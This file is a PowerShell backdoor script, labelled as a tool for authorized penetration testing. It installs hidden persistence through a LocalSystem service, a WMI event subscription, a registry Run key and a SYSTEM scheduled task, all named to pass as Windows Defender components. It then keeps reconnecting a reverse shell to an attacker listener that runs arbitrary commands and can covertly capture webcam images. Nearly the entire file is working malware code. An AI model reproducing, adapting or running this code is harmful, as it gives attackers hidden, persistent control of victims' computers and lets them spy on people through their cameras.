<#
.SYNOPSIS
    Persistent PowerShell backdoor for authorized pentesting
.NOTES
    Replace LISTENER_IP and LISTENER_PORT placeholders
#>

param()

$ip = LISTENER_IP
$port = LISTENER_PORT
$scriptPath = "$env:ProgramData\svchost.ps1"

# === ENSURE PERSISTENCE (Multiple Methods) ===

# 1. Windows Service (already created by BadKB, but ensure it exists)
$svc = Get-Service "WindowsDefenderService" -ErrorAction SilentlyContinue
if (-not $svc) {
    sc.exe create "WindowsDefenderService" binPath="cmd /c powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`"" start=auto DisplayName="Windows Defender Service" obj="LocalSystem" | Out-Null
    sc.exe start "WindowsDefenderService" | Out-Null
}

# 2. WMI Event Subscription (triggers on boot, very stealthy)
$filterArgs = @{
    Namespace = 'root\subscription'
    Name = 'WindowsDefenderFilter'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace $filterArgs.Namespace -Class __EventFilter -Arguments @{
    Name = $filterArgs.Name
    EventNamespace = $filterArgs.EventNameSpace
    QueryLanguage = $filterArgs.QueryLanguage
    Query = $filterArgs.Query
} -ErrorAction SilentlyContinue

$consumer = Set-WmiInstance -Namespace $filterArgs.Namespace -Class CommandLineEventConsumer -Arguments @{
    Name = 'WindowsDefenderConsumer'
    CommandLineTemplate = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`""
} -ErrorAction SilentlyContinue

# Bind filter and consumer
$binding = Set-WmiInstance -Namespace $filterArgs.Namespace -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
} -ErrorAction SilentlyContinue

# 3. Registry Run key (fallback)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "WindowsDefenderUpdate" -Value "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue

# 4. Scheduled Task (on startup, as SYSTEM)
$taskName = "WindowsDefenderTask"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue

# === MAIN BACKDOOR LOOP ===

function Start-ReverseShell {
    param($IP, $Port)
    
    try {
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        # Send initial banner
        $writer.WriteLine("Connected to $env:COMPUTERNAME\$env:USERNAME")
        $writer.Write("PS $($pwd.Path)> ")
        $writer.Flush()
        
        while ($client.Connected) {
            $line = $reader.ReadLine()
            if (-not $line) { break }
            
            $output = ""
            
            switch -Regex ($line.Trim()) {
                "^exit$" {
                    $writer.WriteLine("Goodbye")
                    $writer.Flush()
                    $client.Close()
                    return
                }
                "^persist$" {
                    $output = "Persistence already configured"
                }
                "^run (.+)$" {
                    $cmd = $matches[1]
                    try {
                        $psi = New-Object System.Diagnostics.ProcessStartInfo
                        $psi.FileName = "powershell.exe"
                        $psi.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Command `"$cmd`""
                        $psi.WindowStyle = 'Hidden'
                        $psi.CreateNoWindow = $true
                        $psi.UseShellExecute = $false
                        [System.Diagnostics.Process]::Start($psi) | Out-Null
                        $output = "OK: $cmd launched hidden"
                    } catch {
                        $output = "Error: $_"
                    }
                }
                "^hidden (.+)$" {
                    $cmd = $matches[1]
                    try {
                        $psi = New-Object System.Diagnostics.ProcessStartInfo
                        $psi.FileName = $cmd.Split(' ')[0]
                        $psi.Arguments = $cmd.Substring($cmd.IndexOf(' ') + 1)
                        $psi.WindowStyle = 'Hidden'
                        $psi.CreateNoWindow = $true
                        $psi.UseShellExecute = $false
                        [System.Diagnostics.Process]::Start($psi) | Out-Null
                        $output = "OK: $cmd launched hidden"
                    } catch {
                        $output = "Error: $_"
                    }
                }
                "^camera$|^cam$|^photo$" {
                    try {
                        # Launch hidden camera capture
                        $captureScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

`$form = New-Object System.Windows.Forms.Form
`$form.WindowState = 'Minimized'
`$form.ShowInTaskbar = `$false
`$form.Opacity = 0

`$timer = New-Object System.Windows.Forms.Timer
`$timer.Interval = 2000
`$timer.Add_Tick({ `$form.Close() })
`$timer.Start()

`$form.Add_Shown({ `$form.Activate() })
`$form.Show()
`$form.Activate()

Start-Sleep -Milliseconds 500

# Use SendKeys to trigger camera
[System.Windows.Forms.SendKeys]::SendWait('{LWIN}')
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait('camera')
Start-Sleep -Milliseconds 1000
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
Start-Sleep -Milliseconds 3000
[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')
Start-Sleep -Milliseconds 500

# Save clipboard as image
if ([System.Windows.Forms.Clipboard]::ContainsImage()) {
    `$img = [System.Windows.Forms.Clipboard]::GetImage()
    `$path = "`$env:TEMP\cam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
    `$img.Save(`$path, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    `$output = `$path
}
"@
                        $captureResult = powershell -NoP -NonI -Exec Bypass -Command $captureScript
                        $output = "Camera capture: $captureResult"
                    } catch {
                        $output = "Camera error: $_"
                    }
                }
                default {
                    # Execute any PowerShell command
                    try {
                        $output = Invoke-Expression $line 2>&1 | Out-String
                    } catch {
                        $output = "Error: $_"
                    }
                }
            }
            
            $writer.Write($output.Trim() + "`nPS $($pwd.Path)> ")
            $writer.Flush()
        }
    } catch {
        # Silently fail and retry
    }
    finally {
        if ($client) { $client.Close() }
    }
}

# === RECONNECTION LOOP ===
while ($true) {
    Start-ReverseShell -IP $ip -Port $port
    Start-Sleep -Seconds 10  # Wait before reconnecting
}
